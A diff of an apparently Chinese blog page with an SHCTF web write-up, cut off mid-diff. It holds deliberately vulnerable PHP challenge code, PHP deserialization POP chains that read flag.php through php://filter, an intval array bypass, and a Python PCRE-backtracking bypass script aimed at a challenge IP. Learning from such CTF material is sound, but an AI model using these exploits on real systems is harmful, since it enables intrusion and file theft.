@@ -6,14 +6,12 @@
     <meta charset="utf-8">
     <meta name="keywords" content="SHCTF-Web-WP, RE,Misc,Web,Cpypto等">
     <meta name="description" content="WEEK1ez_serialize源码
-var_1);
- }
-}
-class B{
- public $q;
- public function __wakeup()
-{
- if(preg_match(&#34;/gopher|http|file|ft">
+&amp;lt;?php
+highlight_file(__FILE__);
+class A&amp;#123;
+ public $var_1; 
+ public function __invoke()&amp;#123;
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -347,7 +345,7 @@ class B{
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.9k
+                    3.2k
                 </div>
                 
 
@@ -364,113 +362,110 @@ class B{
         <hr class="clearfix">
 
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
 
         
 
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><p>源码</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
-<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{
- <span class="keyword">public</span> <span class="variable">$var_1</span>; 
- <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{
-  <span class="keyword">include</span>(<span class="variable language_">$this</span>->var_1);
- }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">B</span></span>{
- <span class="keyword">public</span> <span class="variable">$q</span>;
- <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>
-<span class="function"></span>{
- <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="variable">$this</span>->q)) {
-      <span class="keyword">echo</span> <span class="string">"hacker"</span>;      
-    }
-}
-}
-<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>{
- <span class="keyword">public</span> <span class="variable">$var</span>;
- <span class="keyword">public</span> <span class="variable">$z</span>;
-  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{
-    <span class="keyword">return</span> <span class="variable language_">$this</span>->z-><span class="keyword">var</span>;
-  }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">D</span></span>{
- <span class="keyword">public</span> <span class="variable">$p</span>;
-  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>{
-    <span class="variable">$function</span> = <span class="variable language_">$this</span>->p;
-    <span class="keyword">return</span> <span class="variable">$function</span>();
-  } 
-}
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]))
-{
-  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);
-}
-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+class A&#123;
+ public $var_1; 
+ public function __invoke()&#123;
+  include($this-&gt;var_1);
+ &#125;
+&#125;
+class B&#123;
+ public $q;
+ public function __wakeup()
+&#123;
+ if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;q)) &#123;
+      echo &quot;hacker&quot;;      
+    &#125;
+&#125;
+&#125;
+class C&#123;
+ public $var;
+ public $z;
+  public function __toString()&#123;
+    return $this-&gt;z-&gt;var;
+  &#125;
+&#125;
+class D&#123;
+ public $p;
+  public function __get($key)&#123;
+    $function &#x3D; $this-&gt;p;
+    return $function();
+  &#125; 
+&#125;
+if(isset($_GET[&#39;payload&#39;]))
+&#123;
+  unserialize($_GET[&#39;payload&#39;]);
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>构造出的poc链代码如下图</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="title function_ invoke__">highlight_file</span>(*<span class="keyword">__FILE__</span>*);
-<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{
-    <span class="keyword">public</span> <span class="variable">$var_1</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(*__FILE__*);
+class A&#123;
+    public $var_1 &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;
 
-   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{    
-   <span class="keyword">include</span>(<span class="variable language_">$this</span>->var_1);    }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">B</span></span>{
-    <span class="keyword">public</span> <span class="variable">$q</span>;
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>
-<span class="function">    </span>{
-        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="variable">$this</span>->q)) {
-            <span class="keyword">echo</span> <span class="string">"hacker"</span>;
-        }
-    }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>{
-    <span class="keyword">public</span> <span class="variable">$var</span>;
-    <span class="keyword">public</span> <span class="variable">$z</span>;
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{
-        <span class="keyword">return</span> <span class="variable language_">$this</span>->z-><span class="keyword">var</span>;
-    }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">D</span></span>{
-    <span class="keyword">public</span> <span class="variable">$p</span>;
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>{
-        <span class="variable">$function</span> = <span class="variable language_">$this</span>->p;
-        <span class="keyword">return</span> <span class="variable">$function</span>();
-    }
-}
-<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();
-<span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();
-<span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();
-<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();
-<span class="variable">$b</span> -> q = <span class="variable">$c</span>;
-<span class="variable">$c</span> -> z = <span class="variable">$d</span>;
-<span class="variable">$d</span> -> p = <span class="variable">$a</span>;
-<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);
-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+   public function __invoke()&#123;    
+   include($this-&gt;var_1);    &#125;
+&#125;
+class B&#123;
+    public $q;
+    public function __wakeup()
+    &#123;
+        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;q)) &#123;
+            echo &quot;hacker&quot;;
+        &#125;
+    &#125;
+&#125;
+class C&#123;
+    public $var;
+    public $z;
+    public function __toString()&#123;
+        return $this-&gt;z-&gt;var;
+    &#125;
+&#125;
+class D&#123;
+    public $p;
+    public function __get($key)&#123;
+        $function &#x3D; $this-&gt;p;
+        return $function();
+    &#125;
+&#125;
+$b &#x3D; new B();
+$c &#x3D; new C();
+$d &#x3D; new D();
+$a &#x3D; new A();
+$b -&gt; q &#x3D; $c;
+$c -&gt; z &#x3D; $d;
+$d -&gt; p &#x3D; $a;
+echo serialize($b);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>传参后可以得到答案</p>
 <p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011955588.png"></p>
-<h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]) && <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>]))
-{
-    <span class="variable">$pattern</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>];
-    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\<|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&|\*|\%/i"</span>,<span class="variable">$code</span>))
-    {
-        <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];
-        <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$pattern</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;print_r("\\1")&#x27;</span>, <span class="variable">$code</span>);
-        <span class="keyword">echo</span> <span class="string">"you are smart"</span>;
-    }<span class="keyword">else</span>{
-        <span class="keyword">die</span>(<span class="string">"try again"</span>);
-    }
-}<span class="keyword">else</span>{
-    <span class="keyword">die</span>(<span class="string">"it is begin"</span>);
-}
-<span class="meta">?></span>
+<h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;code&#39;]) &amp;&amp; isset($_POST[&#39;pattern&#39;]))
+&#123;
+    $pattern&#x3D;$_POST[&#39;pattern&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\&#96;|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\&#x2F;| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%&#x2F;i&quot;,$code))
+    &#123;
+        $code&#x3D;$_GET[&#39;code&#39;];
+        preg_replace(&#39;&#x2F;(&#39; . $pattern . &#39;)&#x2F;ei&#39;,&#39;print_r(&quot;\\1&quot;)&#39;, $code);
+        echo &quot;you are smart&quot;;
+    &#125;else&#123;
+        die(&quot;try again&quot;);
+    &#125;
+&#125;else&#123;
+    die(&quot;it is begin&quot;);
+&#125;
+?&gt;
 it is begin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>第一个判断需要我们get传参’code’，post传参’pattern’。</p>
@@ -483,166 +478,166 @@ it is begin<span aria-hidden="true" class="line-numbers-rows"><span></span><span
 <p><strong>$pattern&#x3D;.</strong>*</p>
 </blockquote>
 <p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012023531.png"></p>
-<h3 id="1zzphp"><a href="#1zzphp" class="headerlink" title="1zzphp"></a>1zzphp</h3><pre class="line-numbers language-highlight php"><code class="language-highlight php">本题源代码
-<span class="meta"><?php</span> 
-<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
-<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;./index.txt&#x27;</span>);
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>]) && <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))
-{
-  <span class="variable">$code</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>];
-  <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];
-  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/[0-9]/"</span>, <span class="variable">$num</span>))
-  {
-    <span class="keyword">die</span>(<span class="string">"no number!"</span>);
-  }
-  <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))
-  {
-   <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="variable">$code</span>))
-   {
-    <span class="keyword">die</span>(<span class="string">&#x27;no touch!&#x27;</span>);
-   }
-   <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$code</span>,<span class="string">&#x27;2023SHCTF&#x27;</span>) === <span class="literal">FALSE</span>)
-   {
-    <span class="keyword">die</span>(<span class="string">&#x27;what do you want&#x27;</span>);
-   }
-   <span class="keyword">echo</span> <span class="variable">$flag</span>;
-  }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="1zzphp"><a href="#1zzphp" class="headerlink" title="1zzphp"></a>1zzphp</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">本题源代码
+&lt;?php 
+error_reporting(0);
+highlight_file(&#39;.&#x2F;index.txt&#39;);
+if(isset($_POST[&#39;c_ode&#39;]) &amp;&amp; isset($_GET[&#39;num&#39;]))
+&#123;
+  $code &#x3D; (String)$_POST[&#39;c_ode&#39;];
+  $num&#x3D;$_GET[&#39;num&#39;];
+  if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))
+  &#123;
+    die(&quot;no number!&quot;);
+  &#125;
+  elseif(intval($num))
+  &#123;
+   if(preg_match(&#39;&#x2F;.+?SHCTF&#x2F;is&#39;, $code))
+   &#123;
+    die(&#39;no touch!&#39;);
+   &#125;
+   if(stripos($code,&#39;2023SHCTF&#39;) &#x3D;&#x3D;&#x3D; FALSE)
+   &#123;
+    die(&#39;what do you want&#39;);
+   &#125;
+   echo $flag;
+  &#125;
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>第一个问题是需要给num传参里不能有数字，第二个问题里用到了intval函数，该函数获取$num里的整数值，如果不是则返回False，并且使用正则表达式函数 <code>preg_match()</code> 来匹配字符串 <code>$code</code> 是否包含 <code>SHCTF</code>，stripos() 函数查找字符串在另一字符串中第一次出现的位置，即查找$code中是否有2023SHCTF，</p>
 <p>第一步中我们可以通过给num传参进行数组绕过，即<strong>url+&#x2F;?num[]&#x3D;1</strong></p>
 <p>然后后面可以通过pcre时间回溯漏洞，发送大量字符串”2023SHCTF”以达到其上限从而能绕过preg_match函数，这样同时满足俩个判断从而得到flag</p>
 <p>代码为</p>
-<pre class="line-numbers language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> requests
-url = <span class="string">"http://112.6.51.212:31219/?num[]=1"</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
+url &#x3D; &quot;http:&#x2F;&#x2F;112.6.51.212:31219&#x2F;?num[]&#x3D;1&quot;
 
-data={
-    <span class="string">&#x27;c_ode&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;2023SHCTF&#x27;</span>
-}
+data&#x3D;&#123;
+    &#39;c_ode&#39;:&#39;very&#39;*250000+&#39;2023SHCTF&#39;
+&#125;
 
-r=requests.post(url,data=data)
-<span class="built_in">print</span>(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+r&#x3D;requests.post(url,data&#x3D;data)
+print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012041609.png"></p>
-<h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h3><pre class="line-numbers language-highlight php"><code class="language-highlight php">源代码
-<span class="meta"><?php</span>
-<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
-<span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>{
-  <span class="keyword">public</span> <span class="variable">$gao</span>;
-  <span class="keyword">public</span> <span class="variable">$fei</span>;
-  <span class="keyword">public</span> <span class="variable">$a</span>;
-  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>{
-    <span class="variable language_">$this</span>-><span class="title function_ invoke__">miaomiao</span>();
-    <span class="variable language_">$this</span>->gao=<span class="variable language_">$this</span>->fei;
-    <span class="keyword">die</span>(<span class="variable language_">$this</span>->a);
-  }
-  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">miaomiao</span>(<span class="params"></span>)</span>{
-    <span class="variable language_">$this</span>->a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;
-  }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>{
-  <span class="keyword">public</span> <span class="variable">$ding</span>;
-  <span class="keyword">public</span> <span class="variable">$dong</span>;
-  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{
-    <span class="keyword">return</span> <span class="variable language_">$this</span>->ding->dong;
-  }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>{
-  <span class="keyword">public</span> <span class="variable">$v</span>;
-  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>{
-    <span class="keyword">echo</span><span class="string">"misca~musca~milaoshu~~~"</span>;
-    <span class="keyword">include</span>(<span class="variable language_">$this</span>->v);
-  }
-}
-<span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>{
-  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>)){
-    <span class="keyword">die</span>(<span class="string">"you should think harder!"</span>);
-  }
-  <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable">$data</span>;
-}
-<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">"wanna_fl.ag"</span>]));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">源代码
+&lt;?php
+highlight_file(__FILE__);
+class misca&#123;
+  public $gao;
+  public $fei;
+  public $a;
+  public function __get($key)&#123;
+    $this-&gt;miaomiao();
+    $this-&gt;gao&#x3D;$this-&gt;fei;
+    die($this-&gt;a);
+  &#125;
+  public function miaomiao()&#123;
+    $this-&gt;a&#x3D;&#39;Mikey Mouse~&#39;;
+  &#125;
+&#125;
+class musca&#123;
+  public $ding;
+  public $dong;
+  public function __wakeup()&#123;
+    return $this-&gt;ding-&gt;dong;
+  &#125;
+&#125;
+class milaoshu&#123;
+  public $v;
+  public function __tostring()&#123;
+    echo&quot;misca~musca~milaoshu~~~&quot;;
+    include($this-&gt;v);
+  &#125;
+&#125;
+function check($data)&#123;
+  if(preg_match(&#39;&#x2F;^O:\d+&#x2F;&#39;,$data))&#123;
+    die(&quot;you should think harder!&quot;);
+  &#125;
+  else return $data;
+&#125;
+unserialize(check($_GET[&quot;wanna_fl.ag&quot;]));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可以构造如下图的poc链</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="title function_ invoke__">highlight_file</span>(*<span class="keyword">__FILE__</span>*);
-<span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>{
-    <span class="keyword">public</span> <span class="variable">$gao</span>;
-    <span class="keyword">public</span> <span class="variable">$fei</span>;
-    <span class="keyword">public</span> <span class="variable">$a</span>;
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>{
-        <span class="variable language_">$this</span>-><span class="title function_ invoke__">miaomiao</span>();
-        <span class="variable language_">$this</span>->gao=<span class="variable language_">$this</span>->fei;
-        <span class="keyword">die</span>(<span class="variable language_">$this</span>->a);
-    }
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">miaomiao</span>(<span class="params"></span>)</span>{
-        <span class="variable language_">$this</span>->a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;
-    }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>{
-    <span class="keyword">public</span> <span class="variable">$ding</span>;
-    <span class="keyword">public</span> <span class="variable">$dong</span>;
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{
-        <span class="keyword">return</span> <span class="variable language_">$this</span>->ding->dong;
-    }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>{
-    <span class="keyword">public</span> <span class="variable">$v</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>{
-        <span class="keyword">echo</span><span class="string">"misca~musca~milaoshu~~~"</span>;
-        <span class="keyword">include</span>(<span class="variable language_">$this</span>->v);
-    }
-}
-<span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>{
-    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>)){
-        <span class="keyword">die</span>(<span class="string">"you should think harder!"</span>);
-    }
-    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable">$data</span>;
-}
-<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">musca</span>();
-<span class="variable">$a</span> -> ding = <span class="keyword">new</span> <span class="title function_ invoke__">misca</span>();
-<span class="variable">$a</span> -> ding -> fei = <span class="keyword">new</span> <span class="title function_ invoke__">milaoshu</span>();
-<span class="variable">$a</span> -> ding -> a = &<span class="variable">$a</span> -> ding ->gao;
-<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
-<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));
-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(*__FILE__*);
+class misca&#123;
+    public $gao;
+    public $fei;
+    public $a;
+    public function __get($key)&#123;
+        $this-&gt;miaomiao();
+        $this-&gt;gao&#x3D;$this-&gt;fei;
+        die($this-&gt;a);
+    &#125;
+    public function miaomiao()&#123;
+        $this-&gt;a&#x3D;&#39;Mikey Mouse~&#39;;
+    &#125;
+&#125;
+class musca&#123;
+    public $ding;
+    public $dong;
+    public function __wakeup()&#123;
+        return $this-&gt;ding-&gt;dong;
+    &#125;
+&#125;
+class milaoshu&#123;
+    public $v &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;
+    public function __tostring()&#123;
+        echo&quot;misca~musca~milaoshu~~~&quot;;
+        include($this-&gt;v);
+    &#125;
+&#125;
+function check($data)&#123;
+    if(preg_match(&#39;&#x2F;^O:\d+&#x2F;&#39;,$data))&#123;
+        die(&quot;you should think harder!&quot;);
+    &#125;
+    else return $data;
+&#125;
+$a &#x3D; new musca();
+$a -&gt; ding &#x3D; new misca();
+$a -&gt; ding -&gt; fei &#x3D; new milaoshu();
+$a -&gt; ding -&gt; a &#x3D; &amp;$a -&gt; ding -&gt;gao;
+$b &#x3D; serialize($a);
+echo serialize(array($a));
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>将输出的序列化值进行传参从而可以得到flag，将其base64解码即是flag</p>
 <p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012052335.png"></p>
 <p>这其中要注意的是传参的 <strong>$wanna_fl.ag</strong>中需要将其转换为 <strong>wanna[fl.ag</strong>以确保岂能在get中正确传参，当get传参出现[时，将会使其变为_，且后续.不会变化，也就是说，如果不做此修改，则会导致.无法被识别，从而无法满足传参的条件。</p>
 <h3 id="no-wake-up"><a href="#no-wake-up" class="headerlink" title="no_wake_up"></a>no_wake_up</h3><p>本题也是一个反序列化题，题目源码为</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
-<span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>{
-  <span class="keyword">public</span> <span class="variable">$username</span>;
-  <span class="keyword">public</span> <span class="variable">$code</span>;
-  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{
-    <span class="variable language_">$this</span>->username = <span class="string">"guest"</span>;
-  }
-  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{
-    <span class="keyword">if</span>(<span class="variable language_">$this</span>->username = <span class="string">"admin"</span>){
-      <span class="keyword">include</span>(<span class="variable language_">$this</span>->code);
-    }
-  }
-}
-<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;try&#x27;</span>]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
